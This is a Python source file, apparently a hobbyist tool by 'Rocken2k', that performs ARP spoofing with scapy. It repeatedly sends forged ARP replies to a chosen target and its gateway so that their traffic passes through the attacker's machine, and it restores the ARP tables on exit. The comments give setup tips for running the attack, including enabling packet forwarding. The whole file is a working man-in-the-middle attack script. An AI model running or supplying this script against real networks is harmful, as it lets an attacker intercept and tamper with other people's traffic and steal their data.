#!/usr/bin/env python

# Program to spoof and IP through ARP request
# Author: Rocken2k
#########
# NOTE1: If you are using this program in a virtual box, and you are using a Bridge Adapter, the MAC address that is
# gonna be broadcasting is the MAC from the host machine. I suggest you use a wireless card just for the virtual
# machine to correctly spoofing the MAC.

# NOTE2: If you are using this attack you should set portfoward for the attack machine allowed to  flow the packets

import scapy.all as scapy  # to use the ARP functions
import time  # to use sleep function to delay sending the ARP packets
import optparse  # to interpreter the parameters
import re #to search the MAC address in the ifconfig command
import subprocess  # to call the command to change the mac


def get_my_mac():  # Get the attacker mac address to use in the spoofing attack
    ifconfig = subprocess.check_output ( ["ifconfig", options.interface])
    my_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig))
    return my_mac.group(0)


def get_mac(target_ip):  # Get the mac address from the target of from the router through ARP request
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    mac_result = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return mac_result[0][1].hwsrc


def spoof(target_ip, gateway_ip):  # saying to the victim that I have router's MAC address
    target_mac = get_mac(target_ip)  # to get the mac in order to use to send to the destination
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=my_mac)
    scapy.send(packet, verbose=False)


def clean_traces(sender, receiver):  # Clean the traces and return the right values of the ARP table
    target_mac = get_mac(sender)
    router_mac = get_mac(receiver)
    packet = scapy.ARP(op=2, pdst=sender, hwdst=target_mac, psrc=receiver, hwsrc=router_mac)
    scapy.send(packet, verbose=False, count=4)


def get_arguments():  # Get arguments for the function
    attribute = optparse.OptionParser ()
    attribute.add_option("-t", "--target_ip", dest="target_ip",
                           help="Target IP - can be discovered using arp command")
    attribute.add_option("-g", "--gateway_ip", dest="gateway_ip",
                           help="Router/Gateway IP - can be discovered using arp command")
    attribute.add_option("-i", "--interface", dest="interface",
                           help="Interface used to spoofing.")
    return attribute.parse_args()


def check_parameters():  # Check if the inputs are valid
    if not options.interface:
        print("Missing the interface, use --help for more info")
        exit()
    elif not options.gateway_ip:
        print("Missing the Router IP,  use --help for more info")
        exit()
    elif not options.target_ip:
        print("Missing the target IP,  use --help for more info")
        exit()


# Define parameters
(options, arguments) = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip

# Call the function to check the parameters
check_parameters()

# Call the function to get mac address
my_mac = get_my_mac()
get_my_mac()

#
sent_packets_count = 0

try:
    while True:  # The spoofing attack
        spoof(target_ip,
                gateway_ip)  # spoof (from whom I will get the info to send to de destination, the ip I am spoofing)
        spoof(gateway_ip,
                target_ip)  # spoof (from whom I will get the info to send to de destination, the ip I am spoofing)
        sent_packets_count = sent_packets_count + 2  # increasing number
        print("\r[+] Packet sent: " + str(sent_packets_count) + " .... Press CTRL + C to quit", end ="")
        time.sleep(2)  # sleep

except KeyboardInterrupt:
    print("[+] Detected CTRL + C ....... Resetting ARP tables ... Please wait. \n")
    clean_traces(target_ip, gateway_ip)
    clean_traces(gateway_ip, target_ip)
